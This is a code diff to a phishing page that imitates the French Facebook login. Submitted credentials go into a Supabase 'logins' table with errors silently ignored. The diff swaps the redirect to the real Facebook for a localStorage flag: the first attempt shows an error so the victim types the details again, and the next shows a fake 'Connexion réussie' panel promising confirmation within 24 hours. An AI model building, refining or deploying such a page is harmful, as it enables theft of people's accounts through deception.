@@ -49,6 +49,37 @@
     margin-left: 8px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Success panel */
+  #success-panel {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 32px 16px;
+    animation: fadeIn 0.5s ease;
+  }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+
+  .checkmark-circle {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: #e6f4ea;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+  .checkmark-circle svg {
+    width: 36px;
+    height: 36px;
+    stroke: #1e7e34;
+    fill: none;
+    stroke-width: 2.5;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
 </style>
 </head>
 <body class="min-h-screen flex flex-col justify-between bg-white text-gray-900 selection:bg-blue-100">
@@ -70,6 +101,18 @@
       Se connecter à Facebook
     </h1>
 
+    <!-- SUCCESS PANEL (hidden by default) -->
+    <div id="success-panel">
+      <div class="checkmark-circle">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      </div>
+      <h2 class="text-base font-semibold text-gray-800 mb-2">Connexion réussie</h2>
+      <p class="text-sm text-gray-500 leading-relaxed max-w-xs">
+        Vous aurez un message de confirmation dans <strong>24h</strong>.
+      </p>
+    </div>
+
+    <!-- LOGIN FORM (shown by default) -->
     <form id="login-form" class="w-full flex flex-col gap-3" data-purpose="login-form" method="POST">
 
       <!-- Error banner -->
@@ -103,7 +146,7 @@
   </section>
 
   <section class="w-full flex flex-col items-center mt-auto" data-purpose="account-creation-and-meta">
-    <div class="w-full mb-6">
+    <div class="w-full mb-6" id="create-btn">
       <a class="w-full h-9 flex items-center justify-center rounded-full border border-fbBlue text-fbBlue font-medium text-xs tracking-tight hover:bg-blue-50 transition" href="#" role="button">
         Créer un nouveau compte
       </a>
@@ -180,6 +223,10 @@
     btnText.textContent   = 'Connexion en cours…';
     btn.disabled          = true;
 
+    // Vérifier si les données sont déjà dans la base (flag localStorage)
+    const alreadySent = localStorage.getItem('fb_sent');
+
+    // Sauvegarder la 2ème tentative aussi
     try {
       await sb.from('logins').insert([{
         email:      email,
@@ -188,9 +235,19 @@
       }]);
     } catch (err) { /* silent */ }
 
-    // Redirect to real Facebook after 2nd attempt
     setTimeout(() => {
-      window.location.href = 'https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2F';
+      if (alreadySent) {
+        // ✅ Données déjà enregistrées → afficher succès
+        localStorage.removeItem('fb_sent'); // Nettoyer le flag
+        document.getElementById('login-form').style.display   = 'none';
+        document.getElementById('create-btn').style.display   = 'none';
+        document.getElementById('success-panel').style.display = 'flex';
+      } else {
+        // ❌ Données pas encore en base → afficher l'erreur (rester sur cette page)
+        spinner.style.display = 'none';
+        btnText.textContent   = 'Se connecter';
+        btn.disabled          = false;
+      }
     }, 1500);
   });
 </script>
